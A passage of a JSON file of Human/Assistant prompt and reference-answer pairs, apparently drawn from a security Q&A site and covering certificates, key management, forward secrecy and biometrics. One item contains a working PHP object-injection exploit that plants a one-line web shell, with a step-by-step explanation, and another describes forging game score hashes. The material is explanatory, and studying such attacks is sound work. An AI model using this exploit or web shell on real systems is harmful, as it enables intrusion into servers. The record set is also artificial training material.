        "golden_answer": " <p>Your description is that the site fails to properly validate their input.  This (weakly) implies a deep flaw in their code.  If your input had simply choked their routine that calls <a href=\"https://www.pbkdf2.com/\" rel=\"noreferrer\"><code>PBKDF2()</code></a>, then your password hash might not have been reproducible; but I would expect a simple password reset should have been adequate to clear up that problem.  Deleting your account might indicate that your account record was corrupt; however, deleting accounts might simply be their response to anyone who has a password problem due to unexpected user input.  They might even be trying to actively thwart hackers with this response.</p>\n\n<p>Also, flawed doesn't necessarily mean their site is vulnerable.  The defective code would need to be exploitable, and you didn't supply evidence of that.  Such evidence might include erratic behavior or inexplicably changed values.</p>\n\n<p>If you decide to press further, perhaps testing individual password characters to isolate the glyph that caused their site to lock your account, know that they would be within their rights to consider those attempts to be a hacking attack.  Seek the site owner's permission before experimenting.</p>\n\n<p>Note that if instead of using high-bit-set characters, you construct your password from 16 cryptographically random, high-bit-unset, standard, ordinary, printable ASCII alphanumeric characters, the practical difference to your password's security will be irrelevant.  </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is code injection possible through packet modification?</p>\n\n<p>For example, if a game sent a packet declaring score=99 could I then modify the packet to score=*code* or something similar? </p>\n\n<p>I guess a similar question would be, is it also possible to execute non-API code in an API environment?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Yes, in the sense that you <em>can</em> forge and send such a packet.</p>\n\n<p>First hurdle: is it still a <em>valid</em> packet? This depends on the packet structure. Many games leverage existing libraries that will use standard formats such as JSON or XML, so it will not be easy to forge a packet that contains the desired code <em>and still</em> be syntactically correct for the involved data format.</p>\n\n<p>Then, will the server accept the packet? Most game developers are wont to wonder what would happen if someone modified</p>\n\n<pre><code>\"score\": 999\n</code></pre>\n\n<p>in</p>\n\n<pre><code>\"score\": 999999999\n</code></pre>\n\n<p>While I suspect, from some leaderboards I see in Google Play, that not all developers gave this possibility enough consideration, the usual low level, low security, but fast method to stop 99% of wannabe \"winnerz\" would be to also include the hash of the value and of a <em>client</em> (<strong>== unsafe</strong>) secret:</p>\n\n<pre><code>\"score\": 99,\n\"hash\": \"ff24e8a1f3fddb010095102bce5a013c\"\n</code></pre>\n\n<p>A member of the remaining 1% of gamers could easily override this by digging out the secret from the game binary, or even trying to bruteforce it out of same binary: most of the time the hash for such a simplistic scheme will be something like MD5(\"SECRET\" + SCORE) or maybe MD5(SCORE + \"SECRET\"), and SECRET will be one of the entries in the binary string table, in clear.</p>\n\n<p>So you send along the modified code with the appropriate hash, and it will pass muster.</p>\n\n<p>If the defense is still tighter, its stage will be almost impossible to overcome, though: the game contains the server's <strong>public</strong> key and uses it to RSA-encrypt the score, not even bothering to send it in the clear.</p>\n\n<p>You can ignore this difficulty if you know that the buffer overflow server side is in the code reading the <em>variable</em> itself, whether it is RSA encrypted or not (i.e., <em>before</em> it is even decrypted).</p>\n\n<p>At this point you've managed to send a string to the server in the hope that it will do something with it.</p>\n\n<p>If the server foolishly makes some hardcoded assumptions on the string length, that could be enough for a buffer overflow. You may have to whip up some ad hoc substitutions to avoid sending a code payload with binary zeroes, which are likely to disrupt the string copy operation, but it's doable (and has been done).</p>\n\n<p>But now another difficulty arises. You have injected <em>something</em> <em>somewhere</em> in the process space of the server. How do you manage this to result in something \"useful\" (from an attacker's point of view)? It might very well be that all of the above only results in the server hiccuping, or malfunctioning for longer periods.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>As I was about to make payment for my flight ticket, I noticed something strange with the <a href=\"https://www.britishairways.com/\" rel=\"nofollow noreferrer\">British Airways</a> website's SSL cert. My browser (Google Chrome) was unable to check whether the certificate has been revoked or not! Here's the exact message:</p>\n\n<p><img src=\"https://i.stack.imgur.com/XKqKV.jpg\" alt=\"enter image description here\"></p>\n\n<p>The message from Google Chrome says:</p>\n\n<blockquote>\n  <p>The identity of this website has been verified by GlobalSign Extended Validation CA - SHA256 - G2 but does not have public audit records.</p>\n  \n  <p>Unable to check whether the certificate has been revoked.</p>\n</blockquote>\n\n<p>I checked certification information and it looks like there's no other problem with the certificate itself. Things that I would like to know:</p>\n\n<ul>\n<li><p>Is it safe to continue with process knowing the fact that your\nbrowser is unable to check cert revocation?</p></li>\n<li><p>How exactly can you confirm if a particular cert has been revoked or\nnot?</p></li>\n</ul>\n\n\nAssistant:",
        "golden_answer": " <p>Revocation is the only method by which a certificate authority may propagate the information that a private key has been compromised. It is, in fact, a damage containment system: in the unfortunate event of a private key being stolen, the revocation system will make sure that nobody trusts the corresponding certificate more than one week or so after the theft is noticed and reported. If a client does not check revocation status, or bypasses it (as you are proposing to do), then this \"one week\" delay is extended to the expiration date of the certificate, which can be years away.</p>\n\n<p>By definition, not checking revocation (or ignoring a failure to check revocation) weakens the system, so it cannot be said that it is \"safe\". But maybe it is not utterly risky. In practice, risks of connecting to a fake Web site are low, because stolen credit card numbers are not worth a lot, and running a fake Web site that successfully emulates a real airline reservation system is a lot of work; hackers who could steal the private key would probably not do that. But that's your decision to take, not mine.</p>\n\n<p>If your browser could not ascertain the revocation status, then chances are that you cannot do it yourself either. However, it may be interesting to know what exactly has happened. Normally, each certificate in the chain contains a URL to the location of the relevant CRL (in a <code>CRL Distribution Points</code> extension). Maybe some of these Web sites are currently unreachable; maybe the CRL they host are out of date, thus revealing a technical glitch on the CA side.</p>\n\n<p>(From my machine, right now, the British Airways certificate looks fine, including revocation status, so chances are that the glitch was temporary.)</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>This is hypothetical problem, so remarks about whether it is feasible in practice are are off topic.</p>\n\n<p>I have been designing a documentation system for medical records where the patient owns his/her own data (instead of how it currently works in most (?) cases where the data is stored in a big database at a hospital or similar - an excellent target for both black hats and authorities). </p>\n\n<p>For example, by getting a physical printed paper after each visit to a doctor with the notes and other details of the visit on. The objection I always get when I suggest this is that it would be a problem in maltreatment cases and similar if the patient could manipulate the documentation.</p>\n\n<p>My solution to this - and this is where I would appreciate input - would look something like this: each paper the doctor gives the patient contains a digital signature (checksum) calculated with the doctors private encryption key (e.g., a QR-code) in its footer. This prevents the patient from manipulating the document undetected.</p>\n\n<p>Next problem is the document chain: the solution in the previous paragraph does not prevent the patient from handing in paper 1, 2 and 4 but ignoring 3. To solve this, every paper also contains the previous documents digital signature in it's body. If the patient presents page 1, 2 and 4 they checksum for the previous document on 2 will match the checksum on 1 but the the checksum for the previous document on 4 won't match the checksum on 2.</p>\n\n<p>Would this work?</p>\n\n<p>One problem remains: what if the patient just presents paper 1, 2 and 3 but not 4? Or if the patient on its fifth visit to the doctor just show 1, 2 and 3 - meaning you get two documents numbered 4? Any ideas for solutions for these problems? A separate log document? How is it solved in current solutions?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>This is hypothetical problem</p>\n</blockquote>\n\n<p>But if you add one \"practicality\" it becomes analogous to one already (more-or-less) solved problem.  The practicality to add is:</p>\n\n<p><em>A doctor should always look at the full medical history of a patient.  What may look at first as an unrelated problem can be an important point in a diagnosis.</em></p>\n\n<p>In other words, <strong>all medical records</strong> of a patient shall always be presented to a doctor.  This solves the discussion (in the comments) about whether presenting part of the documentation (e.g. 1/2/4) is meaningful.  So, if we can assume that a patient must always give all documents, the problem becomes analogous to a <strong>cryptocurrency</strong>.</p>\n\n<p>Bitcoin, or any other cryptocurrency for that purpose, sings all transactions with the private key of the wallet from where the transaction originates.  Then, when the unit of currency is in another wallet, another transaction will be signed with the private key from that wallet.  <a href=\"https://bitcoin.stackexchange.com/questions/45693/how-is-a-transactions-output-signed\">We have an excellent discussion on that on the bitcoin.SE</a> part of the website.</p>\n\n<p>Therefore a solution where one participant sings a piece of data, the next participant adds more data and signs the result, and so on; does exist and is rather effective.  The stack of signatures can be unwind and each verified.</p>\n\n<p>The difference is that with Bitcoin (or any other cryptocurrency for that purpose) the chain is public, because it can be.  Medical record are far from something public, but, as you said, the patient can keep them and still be unable to falsify a doctor's signature or tamper with the signed document.</p>\n\n<p>Keeping all the medical records on some media that will store the chain of signed data would actually force a patient to always show his complete medical record to a doctor.  Which, in my personal opinion (I'm not a doctor or a lawyer), should be a good thing.</p>\n\n<p>P.S. I'm not considering insurance companies in that last statement.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm trying to get my head around 3.6.3 and 3.6.2 in the PCI-DSS standard, secure cryptographic key storage and distribution. </p>\n\n<p>Would having two 256 bit key halves stored in separate, isolated locations which are XORed together to create the data encrypting key count? Is a key encrypting key strictly required? </p>\n\n<p>The encryption service would be able to read both halves and assemble the data encrypting key. All administrative access to a given key half will be restricted by RBAC and auditing. Assuming that the keys are from a suitability random data source having one of the key halves wouldn't provide a <strong>bit</strong> (yes, pun intended) of information as to the actual content of the key. </p>\n\n\nAssistant:",
        "golden_answer": " <p>One of the problems with the PCI DSS is that requirements are either in place or they're not so it's not a risk-based approach. The dual control means no single user has 'the keys to the kingdom' so to speak and the key encrypting key (KEK) prevents the key used for data encryption (let's call it the Data Encryption Key or DEK) from ever being seen in the clear. </p>\n\n<p>The KEK should always be of equal or greater strength than the DEK - I'm not sure the requirements are clear on this though they do recommend you're in line with NIST standards (such as 800-57). I don't think using XOR as a KEK for the DEK would provide this.</p>\n\n<p>Enforcing dual control can be tough - doing it though a service which has access to distributed key parts with separate RBAC is a good idea. Another is having a KEK in an application and DEK encrypted with KEK in a database with RBAC on application and DB systems. MS SQL has a key management system built in using Master Encryption Keys, Data Encryption Keys and certificates to protect keys. StrongAuth have a Lite Encryption Library for doing this also. If you have a QSA, you could ask them how they've seen this implemented in the past.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have recently created some PHP code vulnerable to object injection. Here is the code of my <code>one.php</code> file where I unserialize the <code>data</code> parameter:</p>\n\n<pre><code>&lt;?php\n\nclass utkarsh {\n\n    public $logfile = \"delete.txt\";\n    public $logdata = \"test1\";\n\n    function check()\n    {\n        echo \"Services are good to go &lt;br&gt;\";    \n    }\n\n    function __destruct()\n    {\n        if (file_put_contents(__DIR__ . '/'. $this-&gt;logfile, $this-&gt;logdata));\n        echo \"File contents has been uploaded\";\n    }\n}\n\n$v1 = unserialize(@$_GET['data']);\n\n$object =  new utkarsh();\n$object-&gt;check();\n\n?&gt;\n</code></pre>\n\n<p>And I successfully execute this code.</p>\n\n<p>Now its time to exploit it, so I make another PHP file (called <code>two.php</code>) for serialization. Notice the value of <code>$logdata</code>.</p>\n\n<pre><code>&lt;?php\n\nclass utkarsh \n{\n\n    public $logfile = \"test.php\";\n    public $logdata = '&lt;?php system($_GET[\"cmd\"])?&gt;';\n\n}\n\n$v1 = new utkarsh();\n\n$v2 = serialize($v1);\n\necho htmlspecialchars($v2)\n\n?&gt;\n</code></pre>\n\n<p>And I got this:</p>\n\n<pre><code>O:7:\"utkarsh\":2:{s:7:\"logfile\";s:8:\"test.php\";s:7:\"logdata\";s:28:\"&lt;?php system($_GET[\"cmd\"])?&gt;\";}\n</code></pre>\n\n<p>When I inject this payload in the <code>data</code> parameter of <code>one.php</code> I successfully upload my one liner shell. </p>\n\n<p>But how? I didn't even make any <code>test.php</code> file on my computer. How can this automatically create that file on my computer? </p>\n\n\nAssistant:",
        "golden_answer": " <h1>The two files</h1>\n\n<p>It is important to understand their different roles of the two PHP files that you are using:</p>\n\n<ul>\n<li><code>one.php</code> is the vulnerable system, the one you are attacking.</li>\n<li><code>two.php</code> The second one is just a tool the attacker can use to generate the serialized object (i.e. <code>data</code>). It isn't supposed to be present on the system that you are attacking, and you don't need it at all. You could just as well generate the <code>data</code> string by hand.</li>\n</ul>\n\n<p>So in a real example the two files wouldn't even be present on the same system. The first would run on the server that is being attacked, and the second would be executed localy at the attackers machine.</p>\n\n<p>So why the same classname in both files? Because when <code>data</code> is deserialized on the server, you want it to create an instance of the <code>utkarsh</code> class. After all, that's the class that will write the file for you. For <code>one.php</code> to create an instance of that object, <code>data</code> needs to contain that object name. And an easy way to create a serialized object string containing that class name is to create a different class with that name and serialize it, just as you have done in <code>two.php</code>. </p>\n\n<p>Note that when <code>one.php</code> runs <code>unserialize</code> it creates an instance of the <code>utkarsh</code> it knows about in <code>one.php</code> and not of the one in <code>two.php</code>.</p>\n\n<h1>The actual exploit</h1>\n\n<p>The exploit part of your process is making a request for <code>one.php</code> with the serialized object in the <code>data</code> parameter. So why does that result in a successful exploit? Let's go through, step by step, what is actually happening when <code>one.php</code> is executed.</p>\n\n<ol>\n<li><p>The first row that actually does something is this one:</p>\n\n<pre><code>$v1 = unserialize(@$_GET['data']);\n</code></pre>\n\n<p>Given the <code>data</code> you provided, it will create an object named <code>$v1</code> of the class <code>utkarsh</code> (as defined in <code>one.php</code>) with the following properties:</p>\n\n<pre><code>$logfile = \"test.php\";\n$logdata = '&lt;?php system($_GET[\"cmd\"])?&gt;';\n</code></pre></li>\n<li><p>Then there's this:</p>\n\n<pre><code>$object =  new utkarsh();\n$object-&gt;check(); \n</code></pre>\n\n<p>This creates another instance of the <code>utkarsh</code> class. But it's not realy relevant for the exploit in any way as far as I can see - this should work equally well without those two lines.</p></li>\n<li><p>Then we reach the end of the script. When PHP reaches the end of a script it runs a \"shutdown sequence\". That includes calling the <code>__destruct</code> method on all objects. So for <code>$v1</code> it will run this little piece of code:</p>\n\n<pre><code>file_put_contents(__DIR__ . '/'. $this-&gt;logfile, $this-&gt;logdata)\n</code></pre>\n\n<p>Or, if we enter the variable values:</p>\n\n<pre><code>file_put_contents(__DIR__ . '/test.php', '&lt;?php system($_GET[\"cmd\"])?&gt;')\n</code></pre>\n\n<p>There you have it. You are right that \"you\" didn't write the file - instead you succesfully tricked the PHP script to write the backdoor for you.</p></li>\n</ol>\n\n<h1>Why is the system vulnerable?</h1>\n\n<p>The whole reason that this vulnerability is possible is that you pass user data to <code>unserialize</code>. That allows an attacker to create objects in states that they would never be in during \"normal\" execution of the program, allowing the program to have unexpected effects.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm working on a project where we need to keep a few specific files easily accessible, but encrypted. My idea for accomplishing this is to have the files available in the project's public website, encrypted to all of the members' PGP keys. I know that in theory, this means that only those members can decrypt it, and the files are safe, but is there a risk I'm missing?</p>\n\n\nAssistant:",
        "golden_answer": " <p>There is always a risk that any given cipher will be broken at some point and data like this will become truly public. So yes there are some risks but it doesn't mean you aren't making a reasonable security trade-off.  </p>\n\n<p>A few things you may want to consider:</p>\n\n<p>What's your worse case scenario with the data going public and are there implications to this data going public that you might not be aware of ?</p>\n\n<p>Are there any time-based factors to this data, such as the data is only useful for a year, a week, etc ? </p>\n\n<p>Are there any regulatory, legal, or ethical implications of this data going public ?</p>\n\n<p>Can you add additional security controls such that it's not just one control protecting the data ?</p>\n\n<p>Do the people you want to share this data with need ALL of the data or could they satisfy their needs with a smaller subset of data ?</p>\n\n<p>Is data masking (replacing sensitive data with known fake data ) an option here which would provide additional security ? </p>\n\n<p>Where will it be decrypted and where will the decryption keys be stored ?</p>\n\n<p>Is the passphrase to decrypt it easy to brute force ?</p>\n\n<p>etc... Millions of other questions go here.</p>\n\n<p>Nothing is 100% secure, everything is a trade-off so you need to look at the decision from a few different angles first. </p>\n\n<p>Generally my advice when I see a single security control is to tell you that you need additional levels of security controls rather than just one. So I would have to advise you to consider additional controls but again even then I don't know what you are protecting and if it's just a collection of Internet cat photos then hey maybe just using GPG is good enough... (no offense to GPG of course, that's a great tool but cat photos are everywhere)</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Clearly it works best if the request to update a password happens as a response to an <strong>inbound request</strong> to access a known system, but how do you make an outbound request to users to update their passwords?</p>\n\n\nAssistant:",
        "golden_answer": " <h2>Technical half: changing the password</h2>\n\n<p>The simple and secure way is a round-about, \"You don't.\"</p>\n\n<p>When a user logs in with their old password, display a notice saying they must reset their password. Generate an email with a reset token and send it to their email address. The email address token must be used because we no longer trust the password (and we hope that the email address is still under a users' control).</p>\n\n<h2>Human half: discussing a breach</h2>\n\n<p>If you're requesting users update their passwords, it may be because you're changing hashing algorithms. That really should happen behind the scenes, or involve reclaiming old accounts rather than leaving them dormant. It <em>probably</em> is because you've encountered a breach, though.</p>\n\n<p>Breaches affect customers even if you don't hold any sensitive information because online presences are often linked (same username, email address, etc.) and because passwords are often re-used. If you've lost control of your password database, users may be at risk of having those passwords brute-forced and then used against accounts from other sites.</p>\n\n<p>Regardless of your motivation, the technical method of changing passwords remains the same. If you've had a breach, though, disclosing that is important for your ethical duty to your users and sometimes for legal requirements depending on your jurisdiction. How the letter is written is a combination entirely of legal and subjective matters, but it should explain why users may need to be concerned about other accounts and why they need to reset their password on their next login.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Let us say your web app is sanitizing bad input and displaying the user what the bad input was. Before XSS measure was put in place web app is spitting out malicious script as is. For example Bad address value : <code>&lt;script&gt;bad script goes here &lt;/script&gt;</code></p>\n\n<p>Now after careful sanitizing output could be something like this. Bad street address  : sanitized input. If the input was let us say not script like !@#$ street then it would output Bad street address : !@#$</p>\n\n<p>Do you think using word sanitized is too obvious for output string that is malicious. I figure regular users wont see this. But bad guys are the only ones will see sanitized.\nOr should the app not say anything at all if it sanitizes the input. Or should it replace some of the bad script tags with something other. What is the best known industry best practice here?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Any error message shouldn't provide information to the attacker other than their attempt was unsuccessful. Example: A password/username failure should say the attempt was bad, not whether the username was bad, or the password, or both. If it does, that information might be usable to an attacker in an effort to circumvent your safeguards. Something along the lines of: \"Invalid Address\" or \"Address not Found\" in the case of an Address field would be more than sufficient. The same goes for any other field as well.</p>\n\n<p>Now, I am uncertain as to why you would re-display the malicious information to anyone attempting to insert malicious code into your system. It definitely reveals what is happening behind the scenes, instead of hiding the inner-workings of your system from the attacker.</p>\n\n<p>The vaguer the better.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What is contained inside the LUKS header? I know, the header has size of 2MB. Also, cryptsetup supports \"detached header\", where the header can be stored in a separate file.</p>\n\n<p>Thus, for example, I can format luks device and specify detached header in a separate file:</p>\n\n<pre><code>dd if=/dev/zero of=LUKS-HEADER bs=1M count=2\ncryptsetup luksFormat /dev/sdb1 --header LUKS-HEADER --align-payload=0\n</code></pre>\n\n<p>IIUC, this format operation only writes to the header. The disk partition is not modified (I checked with md5sum). So why does cryptsetyp  luksFormat require specifying the device (/dev/sdb1) ?</p>\n\n<p>Can I share one header for multiple luks devices?</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>After further investigation, it seems to me that the first 4096 B of the header contain the header information, which is being printed with <code>cryptsetup luksDump</code>.</p>\n\n<p>What is stored in the remaining part of the 2MB file is a mystery to me. It seems to be overwritten with random data (I filled it the with zeros initially, so I can see the difference). Also, the 2MB file is absolutely un-compressible.  Further indication of random/encrypted data.</p>\n\n<p><strong>Can somebody please authoritatively explain what is contained in the 2 MB LUKS header?</strong></p>\n\n\nAssistant:",
        "golden_answer": " <p>I believe that the header results being 2MB large because of the Anti-Forensic splitter: the encrypted master key is splitted in several blocks to enhance the diffusion and make sure that it can be easily erased from the disk.\nIn particular erasing one single stripe makes the entire encrypted mk irrecoverable.</p>\n\n<p><a href=\"https://web.archive.org/web/20160517044339/http://tomb.dyne.org/Luks_on_disk_format.pdf\" rel=\"noreferrer\">https://web.archive.org/web/20160517044339/http://tomb.dyne.org/Luks_on_disk_format.pdf</a></p>\n\n<p>here's LUKS2 specification: <a href=\"https://gitlab.com/cryptsetup/LUKS2-docs/blob/master/luks2_doc_wip.pdf\" rel=\"noreferrer\">https://gitlab.com/cryptsetup/LUKS2-docs/blob/master/luks2_doc_wip.pdf</a></p>\n\n<hr>\n\n<p>I wonder how one can extract the encrypted master key...</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I learned that perfect forward secrecy is implemented through DHE and ECDH but what is the difference between these 2 key exchanges?</p>\n\n<p>Also can someone explain how perfect forward secrecy works?  I've found a variety of answers online ranging from: there's a secret session key that's never shared that's generated, there's a session key that changes based on random input from both users, and there's a session key that is derived from a shared secret that only the 2 users know.</p>\n\n\nAssistant:",
        "golden_answer": " <p>First, my apologies for the math, <em>and</em> for overly simplifying the math!</p>\n\n<p>The difference between DHE and ECDH in two bullet points:</p>\n\n<ul>\n<li>DHE uses <a href=\"https://en.wikipedia.org/wiki/Modular_arithmetic\" rel=\"noreferrer\">modular arithmetic</a> to compute the shared secret.  </li>\n<li>ECDH is like DHE but in addition, uses <a href=\"https://en.wikipedia.org/wiki/Algebraic_curve\" rel=\"noreferrer\">algebraic curves</a> to generate keys (An elliptic curve is a type of algebraic curve).</li>\n</ul>\n\n<p>The overall method in both cases is still <a href=\"https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman\" rel=\"noreferrer\">Diffie–Hellman</a>. (Or are we calling it Diffie–Hellman-Merkle these days?)</p>\n\n<p>Perfect forward secrecy is achieved by using temporary key pairs to secure each session - they are generated as needed, held in RAM during the session, and discarded after use.</p>\n\n<p>The \"permanent\" key pairs (the ones validated by a Certificate Authority) are used for identity verification, and signing the temporary keys as they are exchanged. Not for securing the session. </p>\n\n<p>Does that explain things a bit better?</p>\n\n<p>Edit: To examine your examples in detail...</p>\n\n<blockquote>\n  <p>secret session key that's never shared</p>\n</blockquote>\n\n<p>Well, this is the definition of DH key exchange, but isn't related to perfect forward secrecy. DH allows both parties to <em>independently calculate the shared secret will be</em>, without transmitting the shared secret in the clear, over the still-insecure channel.</p>\n\n<blockquote>\n  <p>session key that changes based on random input from both users</p>\n</blockquote>\n\n<p>...Certainly both sides of the connection will use local sources of randomness to derive their temporary session keys, but I think the above phrasing misses the point: perfect forward secrecy is achieved by discarding the session keys after use.</p>\n\n<blockquote>\n  <p>session key that is derived from a shared secret that only the 2 users know</p>\n</blockquote>\n\n<p>By now you're thinking \"How does this fact give us perfect forward secrecy?\" To belabor the point: perfect forward secrecy is achieved by discarding the session keys after use.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've created an application that is exposed via a web service and an Android client that communicates with that web service. Is there a way to have the client authenticate with the web service so that the web service knows it's communicating with the Android app I wrote and not an application masquerading as my Android app?</p>\n\n\nAssistant:",
        "golden_answer": " <p>You can't effectively prevent someone from imitating the app. Even if\n you establish some sort of \"secret app token\" that only the app uses and encrypt the\n communication, it will still be possible to reverse-engineer these measures with manageable effort and mock\n the app behaviour.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I think I found a bug in my website but don't know how dangerous it is. </p>\n\n<p>My website will redirect you to a warning page whenever you click on a link that is pasted in the comments section. </p>\n\n<p>The url of the warning page consists of</p>\n\n<p><a href=\"https://example.com/redirect?signature=xxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;url=http%3A%2F%google.com%2F\" rel=\"nofollow\">https://example.com/redirect?signature=xxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;url=http%3A%2F%google.com%2F</a></p>\n\n<p>If you try to modify the signature code or the url it will prompt you with \"Something went wrong, please try again later\".</p>\n\n<p>Now if you add an \"&amp;\" after the signature nothing will happen! e.g.:</p>\n\n<p><a href=\"https://example.com/redirect?signature=xxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;NothingHappend!&amp;url=http%3A%2F%google.com%2F\" rel=\"nofollow\">https://example.com/redirect?signature=xxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;NothingHappend!&amp;url=http%3A%2F%google.com%2F</a></p>\n\n<p>Is this behavior dangerous or exploitable by anyway?</p>\n\n<p>Thanks in advance</p>\n\n\nAssistant:",
        "golden_answer": " <p>The ampersand character is used to separate arguments supplied to the url when multiple argments are used. In your first example the script receives the following arguments</p>\n\n<pre><code>signature=xxxxxxxxxxxxxxxxxxxxxxxxxxxx\nurl=http%3A%2F%google.com%2F\n</code></pre>\n\n<p>In your second example the script receives the following arguments:</p>\n\n<pre><code>signature=xxxxxxxxxxxxxxxxxxxxxxxxxxxx\nNothingHappend!=\nurl=http%3A%2F%google.com%2F\n</code></pre>\n\n<p>As you can see you have added an additional argument, however as the other arguments haven't changed and your script (probably) doesn't use the \"NothingHappened\" argument it doesn't affect the script in any way.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Thinking about adding a fingerprint based authentication layer, but then I recalled the <a href=\"http://www.youtube.com/watch?v=MAfAVGES-Yc\">MythBusters beat fingerprint security system episode</a> -- is this a common issue, and if not, how do you tell if a fingerprint authentication system is easy or hard to bypass?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Fingerprints can be viewed as a fuzzy source of data. Given the same finger, a reader might never read exactly the same print. That is why most readers require the user to scan a finger multiple times during the registration phase.</p>\n\n<p>During the authentication phase, the system tries to determine if the scan it just acquired is \"close enough\" to the trained data to allow access. This leads to two problems.</p>\n\n<ol>\n<li><p>Remote authentication</p></li>\n<li><p>Keeping biometric private</p></li>\n</ol>\n\n<p><strong>Remote Authentication</strong></p>\n\n<p>Assume I keep my biometric private (we'll deal with that problem later). Can I give another party enough information to correctly authenticate me without requiring them to store enough information to impersonate me (i.e., if someone steals the database, I don't want them to be able to impersonate me)?</p>\n\n<p>It turns out you can. The functions needed are called <a href=\"http://www.cs.bu.edu/~reyzin/papers/fuzzy.pdf\">secure sketches and fuzzy extractors</a>. A secure sketch (SS) is given some data (w) and returns string (s) in other words SS(w)=s. A secure sketch also has a recovery function (Rec). Rec takes as input w' (a noisy copy of w) and s. If w' is sufficiently close to w (where closeness is measured by some distance metric such as hamming distance), then Rec(w',s)=w. Now the server and I share a secret value (namely w) which we can each prove knowledge of to authenticate each other (mutual authentication).</p>\n\n<p>The cool thing about this is that even if someone steals s, they won't be able to impersonate me. There are a few problems with this, however. What if the attacker modifies the copy of s that the server is storing. Could they do that in such a way that w is leaked? In the original work, there were no guarantees that this couldn't happen. Later research, however, removed this restriction by developing what is called a <a href=\"http://www.cs.ucla.edu/~rafail/PUBLIC/67.pdf\">robust secure sketch</a>, which is secure even in the presence of an active adversary (i.e., an adversarial controlled channel).</p>\n\n<p><strong>Keeping biometric private</strong></p>\n\n<p>The above ideas all assumed that w (and w') were kept private. This is probably not a good assumption as seen on <a href=\"http://www.youtube.com/watch?v=MAfAVGES-Yc\">MythBusters</a>. So, researchers went back to the drawing board and said \"Hey what if my fingerprint was my public key\" and thus <a href=\"http://eprint.iacr.org/2004/086.pdf\">Fuzzy Identity-Based Encryption</a> (FIBE) was born.</p>\n\n<p>Closely related to this is Identity Based Encryption, where my identity (e.g., email address) is my public key. Someone uses my email address to encrypt a message. I then prove to a third party that I own the email address, whereupon I am able to retrieve the corresponding private key and decrypt the encrypted message. It is important to note that the sender only needs some public information from the third party to enable her to encrypt messages to any identity. The receiver must at some point (either before or after the encrypted message is actually sent) retrieve his private key.</p>\n\n<p>FIBE builds upon this idea for fuzzy identities. You read my fingerprint (w), I use w' to get my private key and as long as w and w' are close enough, I am able to retrieve the message you send to me (I still have to contact the third party at some time though). An authentication protocol could be built on this so that I need not keep my biometric private.</p>\n\n<p>The major problem with this system (and IBE in general) is the requirement of a third party and the fact that that third party can impersonate me once they have seen a copy of my biometric. The latter problem can be removed by having multiple third parties who all contribute to the process. Thus, no single one can impersonate me. But, then I have to contact multiple people in order to encrypt or decrypt messages.</p>\n\n<p><strong>Application</strong></p>\n\n<p>I'm not sure if any commercial products implement these ideas. So, I cannot speak to commercially available products, but if you are not limited to commercially available products, you could implement these systems yourself and they would probably be pretty secure.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I use drupal for our site. It uses nodes that store data. We link lots of these nodes together to allow us to log jobs, customer info, invoices etc. These are linked via an addon drupal module. If I were to delete the links the entire site would be meaningless to me.</p>\n\n<p>As this module is all that links the nodes together, I am thinking that from a security pov, I could create a database/app on another server and whenever drupal goes to get a linked node id, it will go via this other server (send a key and receive the correct nid in return). If the main database is stolen, the links will be meaningless and it will be basically worthless data.</p>\n\n<p>Is this something that sounds viable and worthwhile?</p>\n\n\nAssistant:",
        "golden_answer": " <p>No.  I suspect this defense is probably not a great use of your time.</p>\n\n<p>If you didn't have the links, the information would be hard for you to use -- hard for the good guys to use easily.  That's bad for usability, because is information isn't easy to use, it probably isn't of much use to many of your users.  But the bad guys aren't under those constraints.  The bad guys could probably still gain a lot of sensitive information, and piece things together enough to give you a bad day.</p>\n\n<p>Do you remember the story of Iranian revolutionary students who stormed the US embassy in Iran?  The US residents shredded many of their documents before evacuating, but the Iranian students were still able to meticulously piece together the fragments of shredded documents into a whole, like a jigsaw puzzle.  They had the time and patience to do it.  Those shredded documents would have been pretty much useless to a legitimate authorized US diplomat, but they were enough for the attackers to work out a lot of sensitive information the US didn't want them to have.  Security is often like that; the bad guys are willing to put in more effort to recover your data than any ordinary user of your site would be.</p>\n\n<p>And in any case, if your site gets hacked, do you want to be in a position to tell the press \"Oh, yeah, they got all the data, but they didn't get the <em>links</em>, so it's all good?\"  That doesn't sound like the kind of thing that is going to inspire trust among your customers.  It's not a pretty picture.</p>\n\n<p>So, I suggest you spend your energy elsewhere.  Remember, security is a risk management effort.  That means you need to prioritize where you spend your time, based upon what gives you the most security benefit for the least time, energy, and cost.  I don't think this defense is a good one.  Instead, I'd focus on the basics, things like application security (SDL), configuration management, network security, disaster preparation and recovery, internal education, and so forth.  Most organizations have a lot of room to improve, even on the basics.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Does anyone know of a secure and transparent method of sending logs from a honeypot server on a DMZ to a logging server in a private network?. <br>\nThe logs must be encrypted and sent in such a way that a potential attacker would not be able to sniff the communication. <br> \nI have tried sending my logs to a valid yet unused IP in my address space and then forward the logs to the private lan via a promisc interface and IPTables. <br>\nThe problem with this solution is that it only works with UDP which is not encrypted and traffic to my logging server can still be sent and sniffed.<br>\nCan anyone propose a better method? <br>\nSomeone told me to use a TAP device to send the information onto a separate bridge but I was unable to understand the logic. </p>\n\n\nAssistant:",
